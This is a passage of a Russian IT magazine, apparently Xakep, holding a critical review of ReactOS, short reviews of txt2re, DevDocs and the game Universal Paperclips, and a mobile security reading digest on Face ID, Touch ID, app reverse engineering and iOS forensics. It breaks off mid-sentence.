С ходу не получи лось… да и потом — тоже. В обоих слу чаях инстал лятор глю‐
чил уже в самом начале, и мы созерцали черный (точнее, темно‐серый)
экран. При этом на тех же ноутбуках в свое время без проблем устанав‐
ливались самые разные операци онки, включая FreeDOS, Windows XP/7, Knop‐
pix и Kali Linux. Загрузка с DVD‐R и флеш ки работа ет на них без проблем —
там олдскульный BIOS (не UEFI).
  Навер няка и ReactOS удалось бы как‐то уста новить на наши бывалые лэп‐
топы, но шаманский бубен вскоре лопнул, как и наше тер пение. Рядовой
поль зователь точно не ста нет мучиться так дол го.
  На YouTube ты можешь най ти ролики с демонс трацией запуска ReactOS
на относительно новых ноут буках Dell. Однако сама идея записать такое
видео уже говорит о нетриви альности задачи. Если автор сни мает ролик, зна‐
чит, этому предшество вал напилинг и риту альные пляски. «Из коробки» Reac‐
tOS мало на что ставится, да и нет у нее никакой коробки — только ночные
сборки на сайте проекта.
  Поэто му дальнейшие тес ты проводи лись в виртуал ке. Именно так годами
запускает ReactOS большинс тво ее поклонни ков: свобод ный клон Windows
работа ет в нес вободной нас тоящей «Вин де».





                 ReactOS под держивает рус ский язык

Заявле но, что ReactOS поддержи вает множество файловых сис тем. Ext2/3/4,
Btrfs, ReiserFS, UFS, NTFS. Казалось бы, выбор огромный! На практике же
системный раздел может быть отформа тиро ван толь ко в FAT, и это еще цве‐
точки!





                             Только FAT!

А ягодки в том, что ReactOS не имеет средств для проверки и исправления
логических ошибок в фай ловой сис теме. Короче, нет в нем чекдиска. Поэтому
пофиксить FAT прос то нечем.





                    Кноп ка есть, а прог раммы нет

По этому меню аварийного восста новления, по сути, оказывается бес полез‐
ным. Что дебаг, что EMS — при слетевшей ReactOS ты прос то увидишь синий
или черный экран — как повезет. Нам повезло уже через полчаса.


ПЕРЕЗАГРУЗКА РЕАКТОРА





                 Аварий ное вос становление реактора

Другая серьезная проблема ReactOS — менед жер памяти. Его постоянно
про бивает на носталь гию. Он пытается обратить ся по адресам из старой таб‐
лицы и навевает вос помина ния о раннем зна комс тве с XP. Помнишь бес‐
конечно сып лющи еся сооб щения «The memory could not be „read“»? В Reac‐
tOS они появляют ся регулярно, как и всевоз можные software exception.





                 Ошибки управления памятью

В ито ге пос ле оче редной ошиб ки система зависа ет наглухо, а при перезаг‐
рузке ста новится синей, как утоп ленник.





                Белый, синий… не хватает красного!

Единственный спо соб снова поднять ReactOS — это вос становить пре дыду‐
щее состояние из образа. Благо VirtualBox быс тро делает снапшоты.
  Сле дующая проб лема (если ты сумеешь до нее дойти) — это драйверы.





                 Оборудование уста новить, не?

Черт бы с ней, со звуковухой! Без веб‐камеры, тачпада и расширенных фун‐
кций клавиатуры тоже можно обойтись. Интернет‐то где? Нам пришлось
перепробовать разные сетевые адап теры (реальные и эму лиру емые), преж де
чем ReactOS смог ла зарабо тать хоть с каким‐то. Им оказал ся древнейший
адаптер на 10 Мбит/с.





                      10 Мбит/с хватит всем!

Беспроводные модули ReactOS не видела в упор. Когда мы подключали диск
с драйверами, на нем были все пункты, кроме «установить». Он прос то исче‐
зал из меню, так как мас тер установки не мог выполнить проверку соответс‐
твия ОС. Да, есть прок тологи ческие способы сделать это. Выд рать фай лы
драйверов, руками распихать их в нужные катало ги… даже реестр можно пра‐
вить руками. Вот толь ко для чего тогда еще в прошлом веке создавали plug‐
n‐play?




Одно из любимых развлечений поклонни ков ReactOS — «матрешки», или вло‐
женная  виртуализация.  Очень  популярна  связ ка  Windows  7  SP1 —
VirtualBox — ReactOS — DOSBox — Windows 3.11. Правда, непонятно, зачем
здесь ReactOS. Цепочку можно сократить.
  Другой пользователь демонстрирует работу при ложе ний для старой mac‐
OS, запущен ной в ReactOS через эмулятор Mini vMac. Это забавно, хоть и не
име ет прак тической ценности. Напоминает фильм Inception и вло женные сно‐
видения.





                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ





       ПОЧЕМУ В ЗАМЕНИТЕЛЕ WINDOWS
                  РАБОТАЮТ ТРОЯНЫ,
              НО НЕ РАБОТАЕТ WORD





СОФТ И ИГРЫ
Ес ли ты каким‐то чудом уста новил ReactOS и даже драй веры для сетевухи, то
при под клю чении к интерне ту станет доступным довольно при ятный менед‐
жер установки программ. Начинать, впро чем, сто ит не с программ, а с биб‐
лиотек.





                       ReactOS App Manager

По началу каталог кажется объемным и удобным, но только пока не поймешь,
что это пол ный спи сок официально под держиваемых в ReactOS программ
и что даже не все из этого списка уста навливается. Некоторые ссыл ки ведут
по ста рым веб‐адресам, и загрузка не про исходит.





             Извес тный вредитель нот фаунд в реакторе

Возможно, ты пом нишь, как тщет но мы пытались открыть сайт Xakep.ru в ОС
«Колиб ри». Она не под держивала HTTPS, и все наши старания были нап‐
расны. ReactOS лишен таких проблем. В нем мож но поставить Firefox и сер‐
фить веб практически полноценно.





       Если в ОС можно открыть Xakep.ru, она не так уж бесполез на

Разработ чики и энтузиас ты ReactOS пред лага ют исполь зовать ее как замену
Windows XP на тех компьютерах, которые служат печатной машин кой. В прин‐
ципе, рядовая секретарша вряд ли заметит подмену. У нее и так вечно
не работа ет Word, зато пасьянс «Косынка» в ReactOS пор тирован удачно.





                           Косынка!

В менеджере пакетов есть даже шареварная версия Diablo  II, и она запус‐
кается, но лучше бы она это го не делала. С вось мибитной графикой и соф‐
твер ным рендерингом играть теоретичес ки можно, как, например, можно
пить сок, прыгая на резинке вниз головой с мос та, но практически — кто
захочет это делать?





                Дьяволь ские развлечения в ReactOS





             Запустить Diablo II мож но, играть — вряд ли

Ко неч но, это еще ограничение виртуал ки. На реальном железе ReactOS
опознает видеокарту (иног да). У нее даже есть драй веры на RIVA TNT2 и чет‐
вертый GeForce. Помнишь такой?





                    GeForce 4 — old school hardcore!

Есть отдель ные методы «проб росить» видеокарту в виртуал ку, но они экспе‐
римен тальные и годятся больше для тестиров щиков, чем для геймеров.
Впро чем, можешь попробовать.




Ес ли ReactOS хороша на компьюте рах, которые используются в качес тве
пишущей машинки, значит, нужна хотя бы одна программа, где можно
было бы набирать тек сты. И желательно не «Блок нот», а пол ноценный тек сто‐
вый процессор. Мы пооче редно поп робовали уста новить разные офисные
пакеты, начиная с Oﬃce 97, который работает даже в Windows 95 и NT 4.0.
   Увы, Microsoft Oﬃce 97 не уста нав лива ется, поскольку в ReactOS отсутс‐
твует NTVDM — виртуальная машина DOS для системы NT.





Microsoft Oﬃce 2000 не устанав лива ется, потому что ему требуется подсисте‐
ма Windows Installer.





Microsoft Oﬃce 2003 зависает во время уста новки — не может выпол нить
регистра цию биб лиотек.





Microsoft Oﬃce 2010 не уста навливается, пос коль ку в ReactOS отсутс тву ет
SQL Setup Enumeration APIs.





WPS Oﬃce 10 уста новился, запустился, но не смог отоб разить приложения.
При ручном запуске текстовый редак тор Writer не может создать новый
документ — ни пустой, ни из шаб лона. Прос то зависа ет.





В  менеджере  приложений  ReactOS  ссылка  на  установку  LibreOﬃce
не работает. Пришлось скачать LibreOﬃce 4.3 с официального сайта. Уста‐
новился! Запускается очень долго (с минуту на Core i7‐4770K). Но при наборе
тек ста не видно курсора, а строчки налезают друг на друга (кривой рен‐
деринг).





OpenOﬃce тоже уста новился, но страдает той же болезнью.





Что ж, остается, кажется, только поставить DOSBox и Word 5.5.





                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ





       ПОЧЕМУ В ЗАМЕНИТЕЛЕ WINDOWS
                  РАБОТАЮТ ТРОЯНЫ,
              НО НЕ РАБОТАЕТ WORD





(БЕЗ)ОПАСНОСТЬ РЕАКТОРА
Поклонни ки ReactOS час то называют ее более безопас ной вариацией Win‐
dows, аргумен тируя это открытым исходным кодом и отсутствием вирусов.
Однако откры тость — это лишь необ ходимое, но не достаточное условие
безопасности, а отсутствие вирусов — временное явление.
  Сегодня ReactOS уже содержит более 9 миллионов строк кода, прибав ляя
почти по миллиону в год. Сколько времени потребуется, чтобы прос то про‐
читать их, не говоря уже об анализе? Аудит прос тейших программ (до пяти
тысяч строк кода) занимает месяцы и обхо дится в чувс тви тельную сумму.
Здесь же перед ауди торами вста нет невыполнимая задача. Анализ кода зай‐
мет годы и окажется бесполезным, пос коль ку все это вре мя разработчики
про должат вносить изме нения. Иначе про ект сно ва заглохнет.
   Что касается вирусов, то с переменным успехом виндовая малварь запус‐
кается в ReactOS уже сейчас. Мы поп робовали заразить ReactOS разными
штам мами, и она оказалась довольно восприимчи вой. Часть инфекций и вов‐
се ста ла для нее смертель ной.





                        WannaCry в ReactOS

WannaCry успешно запускает ся и создает вре менные фай лы: ключ шиф‐
рования, адрес кошелька, инс трукции для оплаты выкупа на разных языках.
При этом самого шифрования не про исхо дит, так как в ReactOS отсутс твуют
необходимые ком поненты.
  Подобным образом себя ведут и дру гие трояны‐шифровальщики. Они
создают записи в реестре и прописывают себя на автозапуск, соз дают
отдельные файлы, но не выполняют собственно шифрования поль зователь‐
ских данных.





                    Реквизиты для выкупа в реестре

Другие разновидности малвари часто завер шают работу с ошибкой.





                      Тро ян поймал иксепшен





          Табуны троянов затоп тали менеджер памяти в ReactOS

Пос ле серии таких ошибок ReactOS выпада ет в синий экран.
  Современные антивирусы в ReactOS не запус каются. Kaspersky Free прос‐
то зависает на первом же этапе инсталляции. Dr.Web мгновенно сваливает
ReactOS в BSoD — быс трее любого трояна. Конеч но, вирусы ей в таком сос‐
тоянии не страшны, вот только работать с ней тоже не получится. Даже пос ле
перезаг рузки (см. FAT и отсутс твие chkdsk).


СОБИРАЕМ НА СТЕРОИДЫ ДЛЯ АЛЬФА-ОПЕРАЦИОНКИ
Развитие любого про екта требует денег. На голом энтузиазме учас тни ки
будут постоян но сме нять ся. Один студент напишет нес колько строк, а потом
другой будет пытаться вник нуть в чужой код, пока не бросит эту затею сам.
По боль шому счету, так и происходит с ReactOS. Сей час ее сырость видна
даже невооруженным гла зом. Часть кнопок нарисована на будущее, и никаких
функций на них не назначено.
   Разработ чики многократно запускали инициати вы по сбору средств,
но особого успе ха они не имели. Нап ример, в 2014 году была запущена кра‐
удфандинговая кампания на Indiegogo, которая провалилась. При требуемой
сумме в 50 тысяч дол ларов собрали только полови ну. Сейчас на сайте про‐
екта предлагается указать объем ежемесячного (или хотя бы разового)
пожер тво вания в евро. На эту просьбу откликает ся так мало людей, что
от намечен ной сум мы пока соб рано всего 5% (и месяц назад было столько
же).





                По моги те рас кочегарить реактор!

Все это сви детельствует о слабом интересе к операционной системе, нес‐
мотря на миллионы скачиваний каждой новой вер сии. Лично мне при чины
сложив шейся ситуации кажутся следующими.
 • ReactOS прев ратилась в долгос трой. Вечную «альфу», которая вот уже
   более двадцати лет не может дорасти до «беты». Это сильно портит
   репута цию проекту.
 • ReactOS име ет невнятное позиционирова ние. Для кого создается эта
   опе рационка?
 • Есть юридические сложности с использовани ем ключевых компонентов
   в ReactOS.
 • Тем пы разработ ки ReactOS не просто слишком мед ленные, они непред‐
   ска зуемые. Можно подождать, ког да знаешь, сколько именно. Неоп‐
   ределенность уби вает.
 • Вы пуск релиза и его дальнейшая поддержка требуют привлечения ква‐
  лифицированных разработчиков на постоянной основе. На это нужна
   не просто прор ва денег, а ста бильная финансовая поддержка, которую
   ReactOS так и не получи ла.

Одно вре мя казалось, что уже все закончилось: россий ский фонд был зак рыт,
а немецкий приостанавливал свою деятельность. В нас тоящее время Reac‐
tOS Deutschland работа ет, а рос сий ский «Фонд ReactOS» реор ганизуется
и активно ведет блог на «Хабрахабре».


ДОГОНИТ ЛИ АХИЛЛЕС ЧЕРЕПАХУ?
По зици онирование — основа любой бизнес‐стратегии, а  тут никакого
позици онирования нет. Наиболее внят но на вопрос «Зачем и для кого соз‐
дается ReactOS?» отвечает Алекс Ионеску (Alex Ionescu), один из ключевых
раз работ чиков ядра этой опе рационки.
  В своем выступле нии он поясняет, что ReactOS вряд ли будет инте ресна
массовому потребителю (сюрприз!), но вполне может заинтересо вать опре‐
деленные группы людей:
 • студентов, желающих получить навык разработки сис темных компонентов.
  Сам он пришел в ReactOS по этой причине. Нужно было сделать сту ден‐
   ческую работу в опенсорсном проекте, а все линуксовые оказались слиш‐
   ком тяжелы для изучения нас коком;
 • владельцев  PoS‐терминалов  и  малых  предприятий,  использующих
   в работе очень ограниченный набор ста рых при ложе ний. Им нет смысла
   перехо дить на Windows 10 или оплачивать лицензии Windows Embedded,
   если появится более дешевый аналог.

Да, никто и не говорит, что ReactOS всегда будет только бесплатной. Плат‐
ные версии Linux дав но существуют, и авто ры ReactOS тоже хотят в итоге оку‐
пить разработ ки по схожей системе монети зации — с бесплатной домашней
и платной ком мерческой версиями. Вот только за платными пингви нами сто‐
ит мощный сап порт, а в реак торной такую поддержку вот уже тре тий десяток
лет предложить не в силах.
  Почему я пишу про двадцать с лишним лет, если официально ReactOS
существует с 1998 года, а в нынешнем варианте — только с 2004 года? Дело
в том, что ранее про ект назывался FreeWin. Он был запущен в 1996 году
как попыт ка сде лать «свою Windows 95» с опенсорсом и гиковатыми девело‐
перами. Два года ушло только на выяснение базовой стратегии, а затем про‐
ект заглох, так тол ком и не начав шись. Весь пар ушел в гудок.
  Лишь в июле 1998 года Джефф Нокс (Jeﬀ Knox) предложил вмес то
девянос то пятых окон взять за основу NT 4.0 и дать проекту новое наз‐
вание — ReactOS. К 2004 году стало ясно, что идея снова протух ла и копиро‐
вать надо уже Windows Server 2003 или Windows XP 64 bit (сло вом, NT 5.2).
Именно эту задачу и пытаются решить в ReactOS до сих пор.
  Опе раци онные системы от Microsoft ус таревают быс трее, чем команде
ReactOS удается сде лать их частичную реплику в рамках свободного проекта.
Говорить в конце 2017 года о попытке вос создать функциональность Windows
Server 2003 и XP 64‐bit по меньшей мере стран но.
   Как сказал Алекс Ионеску на выс туплении в 2013 году: «Сей час бы я выб‐
рал в качестве осно вы Windows 7». Раз говоры об этом идут до сих пор, но,
пока эту тему обсуждают, Microsoft уже похоро нила свое детище.
  Уже сей час есть масса искусс твенных проб лем с использованием Win‐
dows до вер сии 10 на современном железе. Наборы системной логики Intel
двух сотой серии, про цес соры AMD Ryzen и все интеловские камни новее
Skylake не получат полнофункци ональных драйверов для Windows прежних
версий. Офи циально их мож но использовать толь ко в «десятке», а неофи‐
циально — хоть с XP, но только на уровне базовых инструкций. Встроенное
видео и другие полезные вещи на старой Windows будут недос тупны.
   Та ким образом, многие задачи, которые сейчас только обсуждаются
в сообществе ReactOS как перспективные, уже утратили акту аль ность. Более
того, базовые задачи так и не были решены. Например, остается проблема
под клю чения устройств по USB 2.0. Флешка, принтер, ска нер, веб‐камера,
3G‐модем — все это подклю чается к ReactOS на уровне подвига, и каждый
раз по такому случаю записывается деморолик.


АКУЛЫ И ПИРАНЬИ В МОРЯХ ЮРИСПРУДЕНЦИИ
Юридические сложности всег да сто ит принимать во внимание, когда пыта‐
ешься скопиро вать чужой продукт. Даже если ты утверждаешь, что сходство
будет лишь внешним, а весь код написан с нуля, — это слабая аргументация
в суде. У Microsoft есть огромный юридичес кий отдел, который пос тоянно
ищет «пра вонаруши телей» и строчит иски быстрее, чем программисты пишут
свой код. Он при носит компании при быль, сопос тавимую с при былью от про‐
даж Windows. Наив но пред полагать, что в случае хотя бы минимального ком‐
мерческого успе ха ReactOS юристы Microsoft приш лют вмес то исков открыт‐
ки с поздрав лениями.
   Разработ чики утверждают, что ReactOS соз дается по информа ции «из
откры тых источни ков». Увы, но детальное представление о работе ядра NT
5.2 не сос тавить по открытым све дениям. Сначала их нужно сде лать откры‐
тыми. Нап ример, с помощью IDA Pro и SoftICE или утек ших в Сеть исходников.
О том, что при написа нии ReactOS «с нуля», скорее всего, практиковалась
обратная разработка, еще в 2006 году сообщил бывший раз работ чик Reac‐
tOS Хар тмут Бирр (Hartmut Birr). После этого была долгая процедура «очис тки
от нес вобод ного кода» с приоста новкой доступа к фай лам, но кто контро‐
лировал результативность этой охоты на ведьм?
   Согласно офи циальному списку People of ReactOS в нас тоящее время
над проектом трудят ся 25 человек, включая координатора проекта Алексея
Брагина (aka Fireball). В соз дании ReactOS за все вре мя проекта учас твовало
более 200 человек. При этом в каждый момент времени над ним работали
от двух до 35 человек самого разного уровня. Основную массу составляют
студенты. Толь ко они готовы вка лывать даром или поч ти даром.
  Причина прос та: попытка написать аналог Windows с нуля помогает сту‐
дентам лучше разобраться в оригина ле. В частности, Алекс Ионеску после
нескольких лет работы на ReactOS написал серию книг Windows Internals,
став ших бестселлерами. Он даже проводил обучающие занятия в кампусе Mi‐
crosoft… при этом работая в Apple и про должая заниматься ReactOS как дав‐
ним хобби.





  Вот так с помощью нехитрых приспособлений буханка белого хлеба
  превратилась в клон Windows

Возможно, ReactOS со временем ста нет альтер нативой для производителей
PoS‐терминалов. Сегодня они вынуж дены покупать лицензионную Windows
для каждого устрой ства, а обычно такой терминал выполняет прос тейшие
задачи (вроде продажи билетов), и львиная доля оплаченных функций Win‐
dows в нем прос то не используется. Дру гое дело, что лицензию на XP сейчас
можно купить буквально за пару баксов на eBay (их полулегально продают
OEM‐щики и ремон тники), а ори гинальная ОС гарантирует известный уро‐
вень стабильнос ти. Пускай невысо кий, но у ReactOS он все равно ниже.


ИТОГО
По жалуй ста, не принимай те мое брюзжание близ ко к мозгу. Я понимаю, нас‐
колько сложно создать бинарно сов местимый клон зак рытой ОС. Прос то
не понимаю — зачем. Мне стран но видеть, как две сотни талантливых людей
пытаются это сде лать вот уже двадцать лет и отстают от современных реалий
с каждым годом все боль ше.
   Если бы ReactOS сразу называли исследователь ским проектом для сту‐
дентов или тре ниро вочной пло щадкой для разработчиков, боль шая часть
вопросов отпала бы сама собой. Однако ее преподносят как бесплатный
ана лог Windows, собирают на ее развитие деньги и пытаются внедрить
как отечес твенный про дукт в рамках импорто замещения.
   Хо чется верить, что критика хоть немного пойдет на поль зу и те силы,
которые сейчас уходят у команды ReactOS на пиар, перенаправятся на собс‐
твен но разработ ку. Возможно, еще при моей жизни доведут до логичес кого
конца менеджер управле ния памятью Monstera, сделают удоб ный заг рузчик,
добавят драйверы и возможность установить ReactOS на журналиру емую
файловую систему. Сейчас ReactOS пыта ется играть мышцами, а надо бы
сформировать скелет.




                   •Образ ReactOS
                       •Группа ReactOS в ВК
                      •Блог ReactOS на Хабре
PCZONE





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      TXT2RE — ГЕНЕРАТОР РЕГУЛЯРНЫХ ВЫРАЖЕНИЙ ДЛЯ
       ТЕХ, КТО ИХ НЕНАВИДИТ1       Ре гуляр ные выражения помогают быстро и элегантно парсить стро‐
         ки и тексто вые файлы, но только в том случае, если ты хорошо зна‐
        ком с синтаксисом и имеешь некото рый опыт. В про тивном случае
        они прев ращаются в хто нический ужас, продол жительный контакт
        с которым может обернуться потерей рассудка.
          Автор утилиты txt2re не без некото рой гордости говорит, что всег‐
        да ненави дел регэкспы и по воз можнос ти старал ся избегать их. Это,
        впро чем, не помешало ему создать генератор, который, получив
        стро ку текста, позволяет составить регуляр ное выражение.
          Строка авто матически раз бива ется на сос тавляющие — отдель‐
       ные символы и подстроки. Ты выбира ешь, в каком представлении
        хочешь получить их, и txt2re генери рует код на одном из пятнадцати
        язы ков.





        Казалось  бы,  txt2re позволя ет полностью избежать написа ния
        регуляр ных выражений. Увы, у это го метода есть огромный недос‐
          таток: генератору неведомо понятие элеган тно го кода, и на выходе
        получается дикая каша, в которой лучше даже не пытаться что‐то
        разбирать. Автору об этом хорошо известно, но он, кажется, не счи‐
         тает это большой проблемой.
        Может быть, благодаря txt2re ты узнаешь о регулярных выраже‐
        ниях что‐то новое и научишься их использовать без сомнительных
        кос тылей  (тог да  тебя, возможно, заинтересует сервис RegExr,
        который, наоборот, разбирает регэкспы). Но с гораздо большей
        веро ятностью txt2re научит тебя ненавидеть регуляр ки с уде сяте‐
        ренной силой.


      DEVDOCS — УДОБНЫЙ И БЕСПЛАТНЫЙ БРАУЗЕР
      ДОКУМЕНТАЦИИ2        Программи ровать, не заглядывая в Google, нынче редко получается,
        и в этом нет ничего странного, ведь раньше вместо этого приходи‐
        лось судорожно листать спра вочники. Однако хорошая докумен‐
        тация кое в чем превос ходит поиск, особен но когда научишься в ней
        ори енти ровать ся.
         Сервис DevDocs — это браузер документации, в котором из еди‐
        ной поисковой стро ки мож но искать по справкам сразу ко многим
        язы кам, фрей мворкам и биб лиотекам. Во главе  угла, конечно,
        веб‐разработ ка: HTML, CSS, DOM, JavaScript и популярные фрей‐
       мворки вро де Bootstrap и Angular. Однако в биб лиотеке DevDocs
         есть и  традици онные языки прог рамми рования вроде C/C++,
         Python, Ruby, Perl и PHP, а также многие более экзотичес кие: Lua,
          Haskell, Erlang, Kotlin, Rust, Elixir.





        DevDocs работает в браузере, однако поддерживает и офлайновый
       режим — чтобы скачать нужные тебе разделы, перейди по ссылке
        oﬄine и жми кнопку Install нап ротив названий.
           Так же стоит отметить удобные клавиатур ные шоткаты и хороший
        поиск с нечеткой логикой. Кстати, есть воз можность искать по кон‐
         кретному языку или фреймворку — нужно написать его название,
        а затем то, что ищешь.
          Вдох новением для раз работчиков DevDocs, похоже, была прог‐
       рамма Dash для macOS, которая делает ровно то же самое, но на
        данный момент содержит больше доксетов (больше 150) и встра‐
        ивается в популярные редакторы. Однако за Dash нужно пла‐
         тить 25 долларов либо терпеть раз дра жающий тай мер, который вре‐
       мя от вре мени появляется вместо запрошенного раздела.
         Существуют и аналоги для других операционных сис тем. Для Lin‐
         ux есть Zeal, а для Windows — Velocity.


       UNIVERSAL PAPERCLIPS — БРАУЗЕРНАЯ ИГРА, В КОТОРОЙ
     ТЫ — ИСКУССТВЕННЫЙ ИНТЕЛЛЕКТ, ПРОИЗВОДЯЩИЙ
      СКРЕПКИ3
        Эта игра начинается совершенно невин но: ты кликаешь по кнопке,
        которая прибавляет количество скре пок. Один клик — одна скрепка.
       Но уже через пару минут ресур сов хватает для покуп ки пер вого
        автомата, потом следующего, и вот кликать больше не нужно. Игра
        прев ращается в затягивающий эко номи ческий симулятор, который
          к тому же отличается неординарным сюжетом.
             Universal Paperclips не перес тает удивлять и дальше. Каждый раз,
         как ты начинаешь думать, что кон цовка уже близко, игра дела ет кру‐
        той поворот. Интерфейс изменяется, вмес то одних ресурсов появ‐
        ляют ся другие, и про изводство скрепок выходит на новый виток.





       Попыта юсь избежать спойлеров, но не могу не намекнуть на то, что
       сюжет раз вива ется. Поч ти с самого начала искусствен ный интеллект
        постепен но вти рается в доверие к людям и получает за это все
        больше вычислительных ресурсов. Для полного усыпления бдитель‐
        ности нужно будет найти лекарства от всех болезней и установить
       мир во всем мире. И все это ради скре пок!
          Иг ра длится примерно четыре‐шесть часов — эта цифра варь‐
        ируется в зависи мос ти от того, насколько эффективно ты справ‐
       ляешься с менеджментом. Временами Paperclips можно оставлять
        работать в фоне, но это не «пас сивная игра» (представь, такие тоже
       бывают). Если оставить ее без внимания, то через какое‐то вре мя
        эко номи ка твоего скрепочного предпри ятия перекосится и исчерпа‐
         ет один из ресурсов. Зато в любой момент можешь закрыть браузер
        и вернуться поз же — сейв останется в кеше.
X‐MOBILE





     ВЗЛОМ ПРИЛОЖЕНИЙ ДЛЯ AN‐
      DROID И IOS И ИНСТРУМЕНТЫ
    ДЛЯ МОБИЛЬНОГО ПЕНТЕСТЕРА





                                         Евгений Зобнин
                                           Редактор Unixoid и Mobile
                                                     zobnin@glc.ru





В этом выпуске: большое исследова ние безопасности заг‐
рузчиков Android‐смартфонов, гайд по криминалистичес‐
кому анализу iOS, инстру менты исследования безопасности
и руководс тво по взло му приложе ний для Android и iOS, рас‐
сказ о спо собах обойти огра ничения фонового исполне ния
в Android 8 и срав нение трех аль тернатив SQLite: Realm, Ob‐
jectBox и Room. А так же: новые при ложения, инс тру мен ты
взло ма и библиоте ки.


ПОЧИТАТЬ
Как работает Face ID
Face ID Security — офи циальный документ Apple, посвященный безопасности
Face ID. Основные моменты из него:
 • смартфон потребу ет ввести PIN‐код в следующих ситу ациях: 1) устрой ство
   толь ко что включено; 2) с момента прош лой разблокировки прошло
   более 48 ч; 3) PIN‐код не использовался больше чем шесть с половиной
   суток (156 ч), а смартфон не был раз блокиро ван с помощью Face ID более
   четырех часов; 4) устрой ство заб локиро вано уда ленно; 5) пять неудачных
   попыток отсканиро вать лицо; 6) был акти вирован режим SOS;
 • шанс разблокировать смартфон с помощью чужого лица — один к мил‐
   лиону (в случае Touch ID — один к 50 тысячам);
 • эта веро ятность отли чается для близнецов и внешне похожих брать ев
   или сестер, а также для детей до 13 лет, поскольку у них могут еще не
  сфор мироваться окончатель но черты лица;
 • смартфон будет разблокирован только в том слу чае, если человек смотрит
   на него;
 • для счи тыва ния лица Face ID исполь зует около 30 тысяч точек;
 • данные, счи тан ные в про цессе обучения, хра нятся в Secure Encave в фор‐
  ме математичес кой модели и никуда не передаются;
 • для распознавания лица используется ней рон ная сеть, обученная на мил‐
   лиардах изображений и моделей лиц;
 • на работу Face ID не вли яют шляпы, шарфы, очки, контактные линзы;
 • Face ID может работать при любом освещении, даже в пол ной темноте;
 • нейронная сеть способна выявлять попытки обмана с помощью маски
   и фотографии;
 • нейронная сеть может быть обновлена без необходимос ти повторно ска‐
   ниро вать лицо;
 • Face ID подстраивается под изменения в лице и периоди чески обновля ет
   математическую модель;
 • приложе ния, под держивающие Touch ID, будут из короб ки работать с Face
    ID.


Как работает Touch ID
Demystifying Apple’s Touch ID — статья о другом биометричес ком сенсоре
iPhone, датчике отпе чатков пальцев, а точ нее о том, как реали зована сис тема
безопасного хра нения отпечатков. Три клю чевых момента из него:
 • «Хеширование» отпечатка. Как и в случае Face ID, система не хранит изоб‐
   ражение  отпе чатка. Она  сохраня ет  только матема тичес кую  модель,
   с помощью которой можно подтвердить, что два отпе чатка совпада ют,
   но нельзя вос становить ори гинальный отпе чаток. Концептуально такой
   подход схож с тем, что применя ется для хранения паролей в современных
   системах аутентифика ции: пароль хра нит ся в виде SHA‐хеша, который
  мож но толь ко срав нить с хешем другого пароля, но не восстановить ори‐
   гинал.
 • Безопасная передача «хеша» в Secure Enclave. iPhone сохраняет матема‐
   тическую модель отпечат ка в зашиф рован ную область памяти, контро‐
   лируемую процессором Secure Enclave. Канал коммуника ции между дат‐
   чиком отпечатка и Secure Enclave защищен с помощью ключа шиф‐
   рования, прошито го еще на заводе. Это значит, что установленный в кус‐
   тарных условиях датчик отпечат ка не сможет получить доступ к Secure En‐
   clave, а поль зователь увидит знамени тую ошиб ку 53.
 • Secure Enclave — центральная часть системы безопас ности продук тов
   Apple. Это выделен ный про цессор со своей операционной системой, опе‐
   ративной и пос тоянной памятью, к которой не может получить доступ
   основной про цес сор. И та и другая память зашиф рованы, а единственный
   способ обще ния с Secure Enclave — через систему сообщений. В iPhone
   Secure Enclave отве чает за все криптографичес кие опе рации, в том числе
  шифрование данных и хранение клю чей шифрования, а также матема‐
   тической модели отпечатка и лица.


Ис сле дование и взлом приложе ний для Android
Android application reverse engineering — хорошее введение в реверс‐инжи‐
ниринг при ложе ний для Android на при мере простого CrackMe, которое
показы вает окно с предложением ввести пароль. Пароль сравнива ется
с зашиф рованным паролем внутри предложения, и, если они совпадают,
на экра не появ ляется сообщение об успешном взломе.
   Автор предлагает четыре способа взломать CrackMe.
 1. Dex2jar, JD‐GUI и Frida. Метод заключа ется в том, чтобы найти в деком‐
   пилированном коде приложения ID нужной зашифрован ной стро ки, затем
   с помощью Frida внедрить в приложение гад жет, написан ный на JS. Гад‐
   жет вытащит стро ку, дешиф рует ее с помощью функции дешифровки
   самого при ложения и передаст сер веру Frida, работающе му на ПК.
 2. Xposed, Inspeckage и APKStudio. С помощью Inspeckage можно отлавли‐
   вать обращения к SQLite, функциям шиф рования и дос тупа к памяти
   устройства. Иногда этой информации достаточно, чтобы перехватить рас‐
  шифрованную строку, но в данном случае приш лось также модифи циро‐
   вать само при ложение с помощью APKStudio (код дешифровки в нем был,
   но приложе ние не вызывало его).
 3. Патчинг с помощью APKStudio. Самый примитивный метод. Дос таточно
   дизассемблировать приложение и поменять в нем одну строку, чтобы
   CrackMe принимал любую строку как правильную.
 4. Статический анализ с помощью ByteCodeViewer. Вмес то того чтобы запус‐
   кать или модифицировать при ложе ние, его можно изучить, извлечь
   из него зашифрованную строку, а также декомпилировать код рас‐
  шифровки. Затем достаточно соз дать новое при ложе ние, вставить в него
   код дешиф ровки и скормить ему зашиф рован ную строку. Вуаля, при ложе‐
   ние выводит на экран оригинальную стро ку.





                     Веб‐интерфейс Inspeckage


Ис сле дование приложе ний для iOS с помощью отладчика
iOS Debug Hacks — большая статья, посвященная отладке приложений,
а если быть точным — исследованию приложений с помощью отладчика
LLDB. Пер вая половина статьи посвящена введению в язык ассемблер, вто‐
рая — при мер отладки при ложе ния с закрытым кодом.


Криминалистический анализ iOS
iOS forensics — огромная статья о криминалис тическом анализе устрой ств
на базе iOS. Покрывает практически все аспекты ана лиза, начиная от того,
что делать в пер вую очередь (вынуть SIM, включить режим полета и засунуть
девайс в клетку Фарадея), и заканчивая опи санием структуры файловой сис‐
темы и мест расположе ния самых интерес ных данных.
  Некоторые при веденные в статье инструкции, такие как, например, опи‐
сание взлома PIN‐кода и получение джейлбрей ка, уже устарели, но сведения,
связанные со структурой файловой системы, еще акту альны.


Как работает фун кция отключения Wi-Fi в Android
Does disabling Wi‐Fi prevent my Android phone from sending Wi‐Fi frames? —
интерес ное иссле дование на тему того, как на самом деле работает функция
отклю чения Wi‐Fi в Android. Авто ры взяли несколько смар тфонов на раз ных
версиях Android, расположили их в помещении с точкой доступа и сниф‐
фером и поиграли с нас тройками.
  Вы воды: при отклю чении Wi‐Fi смартфон про должает слать широковеща‐
тель ные зап росы, чтобы выяснить, есть ли поблизости точка доступа. Смар‐
тфон исполь зует MAC‐адреса точек доступа для опре деле ния своего мес‐
